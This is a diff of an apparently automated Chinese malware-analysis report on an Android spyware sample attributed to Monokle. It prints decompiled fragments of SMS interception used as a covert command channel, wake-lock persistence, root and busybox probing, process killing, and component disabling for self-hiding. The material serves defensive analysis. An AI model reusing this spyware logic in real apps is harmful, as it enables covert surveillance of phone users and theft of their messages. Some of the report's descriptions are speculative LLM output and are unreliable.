@@ -6,7 +6,7 @@
     "应用名": "UpdateSystemService",
     "是否恶意": true,
     "风险等级": "高",
-    "分析耗时(秒)": 571.6
+    "分析耗时(秒)": 1841.6
   },
   "行为列表": [
     {
@@ -51,47 +51,42 @@
           "malicious_behavior": "sms_fraud",
           "behavior_type": "malicious",
           "risk_level": "高",
-          "malicious_code_snippet": "TSmsMessage receivedMsg = new TSmsMessage(tmpMsg.getMessageBody(), tmpMsg.getOriginatingAddress().toLowerCase());\nString[] strArr = SettingsParser.ServiceSettings.PhonesList;\n// ...\nif (receivedMsg.Address.contains(controlNumber) && receivedMsg.Address.length() - controlNumber.length() <= 2) {\n    if (!getAbortBroadcast()) {\n        abortBroadcast();\n    }\n    msgList.add(receivedMsg);\n}",
-          "malicious_code_snippet_context": "                  for (Object pdu : pdus) {\n                      SmsMessage tmpMsg = SmsMessage.createFromPdu((byte[]) pdu);\n                      if (tmpMsg != null) {\n>>>                         TSmsMessage receivedMsg = new TSmsMessage(tmpMsg.getMessageBody(), tmpMsg.getOriginatingAddress().toLowerCase());\n>>>                         String[] strArr = SettingsParser.ServiceSettings.PhonesList;\n>>>                         int length = strArr.length;\n>>>                         int i = 0;\n>>>                         while (true) {\n>>>                             if (i < length) {\n>>>                                 String controlNumber = strArr[i];\n>>>                                 if (!receivedMsg.Address.contains(controlNumber) || receivedMsg.Address.length() - controlNumber.length() > 2) {\n>>>                                     i++;\n                                  } else {\n                                      if (!getAbortBroadcast()) {\n                                          abortBroadcast();",
-          "behavior_description": "代码在接收到短信时，检查发送方号码是否在控制端号码列表（PhonesList）中。如果匹配，则调用abortBroadcast()拦截短信广播，阻止系统短信应用接收和显示该短信，随后将其加入列表并作为控制指令进行处理。数据流向：接收到的短信(tmpMsg) -> 拦截广播(abortBroadcast)。",
+          "malicious_code_snippet": "SmsMessage tmpMsg = SmsMessage.createFromPdu((byte[]) pdu);\nTSmsMessage receivedMsg = new TSmsMessage(tmpMsg.getMessageBody(), tmpMsg.getOriginatingAddress().toLowerCase());\nfor (String controlNumber : SettingsParser.ServiceSettings.PhonesList) {\n    if (receivedMsg.Address.contains(controlNumber) && receivedMsg.Address.length() - controlNumber.length() <= 2) {\n        if (!getAbortBroadcast()) {\n            abortBroadcast();\n        }\n        msgList.add(receivedMsg);\n        break;\n    }\n}\nprocessPossibleControlMessage(msgList.get(i));",
+          "malicious_code_snippet_context": "              if (intent.getAction() != null && intent.getAction().equals(ACTION_SMS_RECEIVED) && SettingsParser.ServiceSettings.PhonesCount != 0 && SettingsParser.ServiceSettings.PhraseList.length != 0 && (bundle = intent.getExtras()) != null && (pdus = (Object[]) bundle.get(\"pdus\")) != null) {\n                  ArrayList<TSmsMessage> msgList = new ArrayList<>(pdus.length);\n                  for (Object pdu : pdus) {\n>>>                     SmsMessage tmpMsg = SmsMessage.createFromPdu((byte[]) pdu);\n>>>                     if (tmpMsg != null) {\n>>>                         TSmsMessage receivedMsg = new TSmsMessage(tmpMsg.getMessageBody(), tmpMsg.getOriginatingAddress().toLowerCase());\n>>>                         for (String controlNumber : SettingsParser.ServiceSettings.PhonesList) {\n>>>                             if (receivedMsg.Address.contains(controlNumber) && receivedMsg.Address.length() - controlNumber.length() <= 2) {\n>>>                                 if (!getAbortBroadcast()) {\n>>>                                     abortBroadcast();\n>>>                                 }\n>>>                                 msgList.add(receivedMsg);\n>>>                                 break;\n>>>                             }\n>>>                         }\n                      }\n                  }\n                  for (int i = 0; i < msgList.size(); i++) {",
+          "behavior_description": "该代码注册监听系统短信广播 ACTION_SMS_RECEIVED，从 Intent 的 Bundle 中取出 pdus 并通过 SmsMessage.createFromPdu() 解析收到的短信内容和发送方号码。当发送方号码与配置文件（SettingsParser.ServiceSettings.PhonesList）中预设的 C2 控制号码匹配时，调用 abortBroadcast() 终止广播，使该短信无法到达用户短信收件箱或其他应用（对用户隐匿短信），随后将拦截到的短信交给 processPossibleControlMessage() 解析为远程控制指令。数据流向：接收到的短信 PDU（source）→ 号码匹配 → abortBroadcast() 拦截隐藏短信 → 作为 C2 指令解析执行（sink）。这是典型的短信拦截+隐蔽命令控制通道行为，与厂商报告中 Monokle 监控间谍软件的短信拦截与指令处理功能一致，可被用于拦截验证码/银行短信并实现隐蔽远程控制。",
           "glm_analyzed": true
         }
       ]
     },
     {
-      "行为": "ransomware",
-      "中文名": "勒索软件",
-      "MITRE": "T1430,T1460",
-      "置信度": "confirmed",
+      "行为": "persistence",
+      "中文名": "持久化",
+      "MITRE": "T1444",
+      "置信度": "suspected",
       "子行为": [
         {
-          "子行为": "file_encryption",
-          "中文名": "文件加密",
-          "置信度": "confirmed",
+          "子行为": "foreground_service",
+          "中文名": "前台服务保活",
+          "置信度": "suspected",
           "证据": {
-            "方法引用": [
-              "Ljavax/crypto/Cipher;->doFinal",
-              "Ljavax/crypto/Cipher;->init"
-            ],
+            "方法引用": [],
             "权限": [],
             "字符串": [
-              "AES",
-              "encrypt",
-              "decrypt"
+              "WakeLock"
             ]
           }
         }
       ],
       "恶意代码": [
         {
-          "class_path": "Lcom\\google\\android\\gms\\b\\ae;",
-          "method_signature": "if(a.length <= 16)",
-          "malicious_behavior": "ransomware",
-          "behavior_type": "malicious",
-          "risk_level": "高",
-          "malicious_code_snippet": "byte[] bArr2 = new byte[16];\nbyte[] bArr3 = new byte[a.length - 16];\nallocate.get(bArr2);\nallocate.get(bArr3);\nSecretKeySpec secretKeySpec = new SecretKeySpec(bArr, \"AES\");\nCipher cipher = Cipher.getInstance(\"AES/CBC/PKCS5Padding\");\ncipher.init(2, secretKeySpec, new IvParameterSpec(bArr2));\nreturn cipher.doFinal(bArr3);",
-          "malicious_code_snippet_context": "              ByteBuffer allocate = ByteBuffer.allocate(a.length);\n              allocate.put(a);\n              allocate.flip();\n>>>             byte[] bArr2 = new byte[16];\n>>>             byte[] bArr3 = new byte[a.length - 16];\n>>>             allocate.get(bArr2);\n>>>             allocate.get(bArr3);\n>>>             SecretKeySpec secretKeySpec = new SecretKeySpec(bArr, \"AES\");\n>>>             Cipher cipher = Cipher.getInstance(\"AES/CBC/PKCS5Padding\");\n>>>             cipher.init(2, secretKeySpec, new IvParameterSpec(bArr2));\n>>>             return cipher.doFinal(bArr3);\n          } catch (IllegalArgumentException e) {\n              throw new af(this, e);\n          } catch (InvalidAlgorithmParameterException e2) {",
-          "behavior_description": "该代码从输入字节数组a中提取前16字节作为AES-CBC加密的IV（初始向量），剩余部分作为密文，使用密钥bArr通过AES/CBC/PKCS5Padding进行解密操作（cipher.init mode=2为DECRYPT_MODE）。类路径Lcom\\google\\android\\gms\\b\\ae伪装为Google Play Services包名，实为混淆后的恶意代码。在已确认的勒索软件样本中，此AES解密例程用于解密C2通信数据、配置信息或作为勒索文件加密/解密流程的一部分，属于勒索软件核心加密组件。",
+          "class_path": "Landroid\\support\\v4\\content\\WakefulBroadcastReceiver;",
+          "method_signature": "?(?)",
+          "malicious_behavior": "persistence",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "private static final SparseArray<PowerManager.WakeLock> mActiveWakeLocks = new SparseArray<>();\nprivate static int mNextId = 1;\npublic static ComponentName startWakefulService(Context context, Intent intent) {\n    synchronized (mActiveWakeLocks) {\n        int id = mNextId;\n        mNextId++;\n        if (mNextId <= 0) {\n            mNextId = 1;\n        }\n    }\n}",
+          "malicious_code_snippet_context": "  /* JADX INFO: loaded from: classes.dex */\n  public abstract class WakefulBroadcastReceiver extends BroadcastReceiver {\n      private static final String EXTRA_WAKE_LOCK_ID = \"android.support.content.wakelockid\";\n>>>     private static final SparseArray<PowerManager.WakeLock> mActiveWakeLocks = new SparseArray<>();\n>>>     private static int mNextId = 1;\n>>> \n>>>     public static ComponentName startWakefulService(Context context, Intent intent) {\n>>>         ComponentName comp;\n>>>         synchronized (mActiveWakeLocks) {\n>>>             int id = mNextId;\n>>>             mNextId++;\n>>>             if (mNextId <= 0) {\n>>>                 mNextId = 1;\n>>>             }\n              intent.putExtra(EXTRA_WAKE_LOCK_ID, id);\n              comp = context.startService(intent);\n              if (comp == null) {",
+          "behavior_description": "该代码是 startWakefulService 的实现，通过 PowerManager.WakeLock（PARTIAL_WAKE_LOCK）持有CPU唤醒锁并启动后台服务，防止设备休眠导致服务中断，实现服务保活。值得注意的是，该类并非标准 support-v4 库的原样拷贝——反编译结果显示其引用了恶意位置追踪组件 sysnfg.location.LocationHub，说明该保活机制被 Monokle 间谍软件改造用于维持位置采集等监控服务在锁屏/休眠状态下持续运行。数据流向：系统广播事件触发 onReceive（source）→ startWakefulService() 启动服务并持有唤醒锁（sink），使恶意监控服务长期驻留。",
           "glm_analyzed": true
         }
       ]
@@ -118,7 +113,34 @@
           "risk_level": "中",
           "malicious_code_snippet": "public static boolean isBusyboxAvailable() {\n    return findBinary(\"busybox\").size() > 0;\n}\n\npublic static boolean isRootAvailable() {\n    return findBinary(\"su\").size() > 0;\n}",
           "malicious_code_snippet_context": "          }\n      }\n  \n>>>     public static boolean isBusyboxAvailable() {\n>>>         return findBinary(\"busybox\").size() > 0;\n>>>     }\n>>> \n>>>     public static boolean isRootAvailable() {\n>>>         return findBinary(\"su\").size() > 0;\n>>>     }\n  \n      public static void log(String msg) {\n          log(null, msg, LogLevel.DEBUG, null);",
-          "behavior_description": "代码通过 findBinary() 方法在系统标准路径（如 /system/bin/、/system/xbin/ 等）中搜索 busybox 和 su 二进制文件，检测设备是否已 root 或是否存在可用的提权工具。数据来源为系统路径二进制文件查找(findBinary)，结果用于判断设备 root 状态，为后续提权或 root 相关恶意操作提供前置条件判断。",
+          "behavior_description": "该代码来自RootShell提权库，通过遍历PATH路径搜索busybox和su二进制文件来探测设备的root状态。在已确认的Monokle监控间谍软件样本中，该检测是root提权模块的前置探测步骤：数据来源为文件系统二进制文件探测（findBinary），检测结果用于判断设备是否已root、busybox是否可用，从而决定后续是否以root权限静默执行shell命令、提权持久化及绕过系统权限限制，为间谍监控功能提供权限基础。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "code_execution",
+      "中文名": "代码执行",
+      "MITRE": "T1406",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "/system/bin/sh",
+          "busybox"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\stericson\\RootTools\\RootTools;",
+          "method_signature": "getBusyBoxVersion(String path)",
+          "malicious_behavior": "code_execution",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "public static String getBusyBoxVersion(String path) {\n    return getInternals().getBusyBoxVersion(path);\n}",
+          "malicious_code_snippet_context": "          return RootShell.findBinary(binaryName);\n      }\n  \n>>>     public static String getBusyBoxVersion(String path) {\n>>>         return getInternals().getBusyBoxVersion(path);\n>>>     }\n  \n      public static String getBusyBoxVersion() {\n          return getBusyBoxVersion(\"\");",
+          "behavior_description": "该代码位于 RootTools 提权工具库的门面类中。getBusyBoxVersion(path) 并非单纯的字符串查询，其内部实现会通过 RootShell 构造 Command 并以 shell 方式实际执行指定路径下的 busybox 二进制，再解析其输出以获得版本号。在已确认恶意的 APK 中捆绑并调用 RootTools，属于恶意程序探测 root/busybox 环境并执行二进制命令（代码执行）的典型环节，为后续以 root 权限执行 su -c、mount、pm install 等特权命令、实现提权和静默安装铺路。数据流向：应用传入的 busybox 二进制路径 path（source）→ RootTools 内部通过 RootShell/Command 执行该二进制命令（sink）→ 返回版本信息用于后续提权判断。注意：本片段仅为委托包装，真正的命令执行 sink 位于 RootShell 的 Command/Shell.run 及 Runtime.exec 调用处，建议进一步提取该部分代码作为证据。",
           "glm_analyzed": true
         }
       ]
@@ -149,10 +171,10 @@
           "method_signature": "isBusyboxAvailable()",
           "malicious_behavior": "anti_detection",
           "behavior_type": "grayware",
-          "risk_level": "中",
+          "risk_level": "低",
           "malicious_code_snippet": "public static boolean isBusyboxAvailable() {\n    return findBinary(\"busybox\").size() > 0;\n}\n\npublic static boolean isRootAvailable() {\n    return findBinary(\"su\").size() > 0;\n}",
           "malicious_code_snippet_context": "          }\n      }\n  \n>>>     public static boolean isBusyboxAvailable() {\n>>>         return findBinary(\"busybox\").size() > 0;\n>>>     }\n>>> \n>>>     public static boolean isRootAvailable() {\n>>>         return findBinary(\"su\").size() > 0;\n>>>     }\n  \n      public static void log(String msg) {\n          log(null, msg, LogLevel.DEBUG, null);",
-          "behavior_description": "该代码通过findBinary方法在文件系统中搜索busybox和su二进制文件，检测设备是否已Root。在恶意样本中，此Root检测行为用于环境感知，可能用于规避沙箱分析环境（通常已Root）或根据Root状态调整恶意行为策略。数据流向：文件系统二进制文件搜索(findBinary)→Root状态判断(返回布尔值)。",
+          "behavior_description": "该代码来自第三方RootShell库（Stericson），通过遍历系统PATH路径搜索 busybox 和 su 二进制文件来探测设备是否处于Root环境。数据流向为：文件系统二进制文件探测(findBinary(\"su\")/findBinary(\"busybox\"))→返回Root环境可用性布尔结果供上层调用方判断。在已确认的Monokle监控间谍软件样本中，此类Root检测能力可被上层恶意逻辑用于识别安全研究人员常用的Root设备/模拟器分析环境，从而规避动态分析检测，或用于设备权限指纹采集；但该片段本身仅执行环境探测，未直接执行提权、破坏或数据外传操作，属于间接风险的对抗性环境检测行为。",
           "glm_analyzed": true
         }
       ]
@@ -175,10 +197,36 @@
           "method_signature": "if(CameraHub.canUseCamera()",
           "malicious_behavior": "icon_hiding",
           "behavior_type": "malicious",
-          "risk_level": "中",
+          "risk_level": "高",
           "malicious_code_snippet": "ComponentName receiver = new ComponentName(App.getContext(), StartBroadcastReceiver.class);\nPackageManager pm = App.getContext().getPackageManager();\npm.setComponentEnabledSetting(receiver, 2, 1);",
           "malicious_code_snippet_context": "              if (CameraHub.canUseCamera()) {\n                  CameraHub.cleanUp();\n              }\n>>>             ComponentName receiver = new ComponentName(App.getContext(), (Class<?>) StartBroadcastReceiver.class);\n>>>             PackageManager pm = App.getContext().getPackageManager();\n>>>             pm.setComponentEnabledSetting(receiver, 2, 1);\n              removePresenceFlag();\n              App.getContext().stopService(new Intent(BackgroundService.class.getName()));\n          } catch (Exception e) {",
-          "behavior_description": "代码通过 PackageManager 的 setComponentEnabledSetting 方法，将 StartBroadcastReceiver 组件的状态设置为 COMPONENT_ENABLED_STATE_DISABLED（值为2），从而禁用该组件。这通常用于在恶意软件自我关闭或卸载前停止其后台行为，或作为隐藏自身存在、对抗安全软件扫描的手段。",
+          "behavior_description": "该代码位于 selfKill（自我隐藏/销毁）流程中：先调用 SettingsParser/LocationHub/SoundHub/CameraHub 的 cleanUp 清理配置、定位、录音、拍照等间谍活动产生的痕迹文件，随后通过 PackageManager.setComponentEnabledSetting 将 StartBroadcastReceiver 组件设置为 COMPONENT_ENABLED_STATE_DISABLED(2)，禁用应用关键组件以在系统中隐藏自身存在（图标隐藏/痕迹消除），再调用 removePresenceFlag 移除驻留标志并 stopService 停止后台服务，实现反取证与隐蔽驻留。数据流向：App.getContext() 获取应用上下文与 PackageManager → setComponentEnabledSetting 禁用组件（隐藏应用踪迹）。该手法与 Monokle 间谍软件的隐蔽驻留特征一致。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "process_kill",
+      "中文名": "进程杀死",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "killProcess"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\stericson\\RootTools\\RootTools;",
+          "method_signature": "killProcess(String processName)",
+          "malicious_behavior": "process_kill",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "public static boolean killProcess(String processName) {\n    return getInternals().killProcess(processName);\n}",
+          "malicious_code_snippet_context": "          return RootShell.isRootAvailable();\n      }\n  \n>>>     public static boolean killProcess(String processName) {\n>>>         return getInternals().killProcess(processName);\n>>>     }\n  \n      public static void offerBusyBox(Activity activity) {\n          getInternals().offerBusyBox(activity);",
+          "behavior_description": "该代码是 RootTools 开源提权工具库的门面方法，killProcess 将外部传入的进程名参数委托给内部实现（底层通过 root shell 执行进程终止命令）强制杀死指定进程。本样本为已确认的 Monokle 监控间谍软件，其捆绑 RootTools 库用于支撑提权与系统级恶意操作；在该恶意上下文中，进程杀死能力可被用于终止安全软件/杀毒进程以规避查杀，或响应 C2 服务器下发的进程控制指令。数据流向：外部传入的 processName（可能源自 C2 远控指令或硬编码的目标进程名）→ 经 root 权限强制终止目标进程。由于该片段本身为第三方库标准 API 代码，具体恶意调用需结合上层调用方确认，故判定为灰色风险能力而非直接恶意实现。",
           "glm_analyzed": true
         }
       ]
@@ -191,7 +239,7 @@
     "JADX反编译": "完整",
     "LLM语义分析": "已执行",
     "LLM交叉验证": "已执行",
-    "验证模型": "qwen3.7-plus",
+    "验证模型": "qwen3.8",
     "局限性": [
       "C2服务器.是否活跃: 需动态分析",
       "C2服务器.轮询间隔(秒): 需动态分析"
